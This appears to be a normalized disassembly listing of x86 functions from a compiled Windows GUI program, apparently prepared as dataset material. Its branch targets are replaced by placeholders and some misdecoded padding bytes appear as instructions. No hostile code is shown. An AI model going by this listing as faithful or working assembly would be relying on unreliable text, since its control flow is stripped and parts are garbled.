pop ebp
retn
sub_42e752
add [ eax ] al
inc eax
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc2 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ebx [ ebp - 0x4 ]
mov cl [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_42e79c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
test [ eax + 0x41 ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0xa ]
push eax
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
call sub_41a61c
mov edx eax
mov ecx [ ebp - 0x8 ]
movsx ecx [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov bx 0xffd9
call sub_44c24c
sub_42e7ec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov al [ ebp - 0x6 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ebx [ ebp - 0x4 ]
mov cl [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_42e834
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x41 ] 0x10
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0xa ]
push eax
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
call sub_41a61c
mov ecx eax
mov dl [ ebp - 0x9 ]
mov eax [ ebp - 0x4 ]
mov bx 0xffd8
call sub_44c24c
sub_42e880
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
test [ eax + 0x40 ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x44 ] 0x2
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_42cdb8
mov edx [ ebp - 0x8 ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_42e834
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
and [ eax + 0x44 ] 0xfffd
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_444534
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
lea eax [ ebp - 0x20 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov bx 0xffec
call sub_44c24c
sub_42e908
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx [ ebp - 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x4 ]
call sub_42e834
pop ecx
pop ecx
pop ebp
retn
sub_42e930
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx [ ebp - 0x8 ]
mov cl 0x2
mov eax [ ebp - 0x4 ]
call sub_42e834
pop ecx
pop ecx
pop ebp
retn
sub_42e958
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_42cd9c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x44 ] 0xfffe
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_42cdb8
mov eax [ ebp - 0x4 ]
test [ eax + 0x44 ] 0x1
je r-xdata
pop ecx
pop ecx
pop ebp
retn
push 0xffffffff
xor ecx ecx
mov edx 0x202
mov eax [ ebp - 0x4 ]
call sub_42df28
jmp r-xdata
sub_42e9b0
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
and ax [ edx + 0x20 ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
cmp [ eax + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x14 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov edx [ ebp - 0xc ]
cmp eax [ edx + 0xc ]
jle r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov edx [ ebp - 0xc ]
cmp eax [ edx + 0x14 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov edx [ ebp - 0xc ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x10 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
mov edx [ ebp - 0xc ]
cmp eax [ edx + 0x8 ]
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov edx [ ebp - 0xc ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
mov edx [ ebp - 0xc ]
cmp eax [ edx + 0x10 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
mov edx [ ebp - 0xc ]
mov [ edx + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
mov edx [ ebp - 0xc ]
mov [ edx + 0x10 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x45 ] 0x4
jne r-xdata
mov eax [ ebp - 0x10 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_42df74
sub_42ead2
add [ eax ] al
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x47 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x41 ] 0x4
je r-xdata
xor ecx ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x40 ] 0x40
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_42d084
mov cl 0x1
sub_42eb60
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
call sub_42cc88
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42cc88
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4a ] 0x1
sub_42ebac
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x50 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x50 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov dl [ eax + 0x4f ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
sub_42ebe8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0x9 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x74 ]
sub_42ec14
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8a ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov dl [ eax + 0x89 ]
mov eax [ ebp - 0x4 ]
call sub_42cbfc
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8a ] 0x1
sub_42ec50
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x49 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov edx [ eax + 0x58 ]
mov eax [ ebp - 0x4 ]
call sub_42cb34
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42cb34
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x49 ] 0x1
sub_42ec9c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x46 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x78 ]
mov eax [ ebp - 0x4 ]
call sub_42cb34
mov eax [ ebp - 0x4 ]
mov [ eax + 0x46 ] 0x1
sub_42ecec
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb013
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
call sub_42df28
sub_42ed1c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb014
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
call sub_42df28
sub_42ed64
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
mov ecx 0x4
[ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_44bfb8
cmp ebx eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
call sub_42bf30
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_42bef4
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_42c280
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
call sub_42c2d4
sub_42edf8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
lea ecx [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43b77c
lea edx [ ebp - 0x14 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x24 ]
call sub_42c3a8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
add eax 0x44
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0xc ]
sub eax [ edx + 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x24 ]
add eax [ edx + 0x3c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub eax [ edx + 0x3c ]
push eax
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp - 0xc ]
sub ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x24 ]
add ecx [ eax + 0x38 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub ecx [ eax + 0x38 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x24 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
add edx [ eax + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x24 ]
mov eax [ eax + 0x30 ]
mov ebx [ ebp - 0xc ]
add eax [ ebx ]
sub eax [ ebp - 0x8 ]
call sub_43b800
lea edx [ ebp - 0x24 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x24 ]
call sub_42c1e4
pop ebx
mov esp ebp
pop ebp
retn
sub_42eec8
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_42ed64
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0xc ]
call sub_434714
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov [ edx + 0x8 ] eax
push ebp
call sub_42edf8
pop ecx
jmp r-xdata
sub_42ef30
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42f04f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f056
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_44cb04
retn
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
call sub_42ca2c
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_42c9ec
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov dl [ eax + 0x59 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x4c ]
cmp al 0x1
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_42c9ec
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x8 ]
call sub_44ce70
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x70
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x60 ]
call sub_44cb34
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x70 ] 0x0
jne r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov dl [ eax + 0x6a ]
mov eax [ ebp - 0x4 ]
call sub_42c838
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x47 ] 0x1
jne r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax + 0x30 ]
mov [ edx + 0x108 ] ecx
mov ecx [ eax + 0x34 ]
mov [ edx + 0x10c ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10a ] 0x0
jne r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
sub_42f05c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42b988
cmp eax [ ebp - 0x8 ]
jne r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov bx 0xfff0
call sub_44c24c
sub_42f0a4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_42f0d8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_42f10c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_42f140
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_42f174
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4427b0
mov eax [ ebp - 0x4 ]
call sub_42b988
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_42bdc0
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_42b988
mov edx eax
mov cl 0x1
mov eax [ ebp - 0x4 ]
mov bx 0xfff0
call sub_44c24c
sub_42f1b4
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42f263
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43ce10
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x4c ]
mov edx eax
mov eax [ ebp - 0x8 ]
call sub_404d1c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0x8 ]
call sub_404e1c
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_42c9ec
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_404c10
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x47 ]
mov eax [ ebp - 0x8 ]
call sub_404fb0
mov eax [ ebp - 0x4 ]
push [ eax + 0x10c ]
push [ eax + 0x108 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f26a
lea eax [ ebp - 0xc ]
call sub_44cae0
retn
sub_42f270
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x1
inc [ ebp - 0x10 ]
dec [ ebp - 0x14 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
fld [ eax + edx * 8 ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
fcomp [ eax + edx * 8 ]
fnstsw ax
sahf
jae r-xdata
sub_42f2c0
push ebp
mov ebp esp
add esp 0xffffffc0
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0xc ] 0x0
jg r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x20 ]
jl r-xdata
mov [ ebp - 0xd ] 0x3
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jg r-xdata
mov [ ebp - 0xd ] 0x4
jmp r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x1c ]
jl r-xdata
mov [ ebp - 0xd ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
sub [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
sub [ ebp - 0x20 ] eax
push ebp
fild [ ebp - 0x18 ]
fstp [ ebp - 0x40 ]
fwait
fild [ ebp - 0x20 ]
fstp [ ebp - 0x38 ]
fwait
fild [ ebp - 0x14 ]
fstp [ ebp - 0x30 ]
fwait
fild [ ebp - 0x1c ]
fstp [ ebp - 0x28 ]
fwait
lea eax [ ebp - 0x40 ]
mov edx 0x3
call sub_42f270
pop ecx
sub eax 0x1
jb r-xdata
mov [ ebp - 0xd ] 0x2
jmp r-xdata
mov [ ebp - 0xd ] 0x3
jmp r-xdata
je r-xdata
mov [ ebp - 0xd ] 0x4
jmp r-xdata
dec eax
je r-xdata
mov [ ebp - 0xd ] 0x1
jmp r-xdata
dec eax
je r-xdata
mov [ ebp - 0xd ] 0x2
jmp r-xdata
sub_42f394
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
call sub_44c1e8
test al al
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_42f3f4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x1
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x7c ]
sub_42f42c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42d26c
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] 0x20000
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_42f458
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx [ eax ]
call [ edx + 0x1c ]
sub_42f478
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov ecx [ eax ]
call [ ecx + 0x60 ]
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
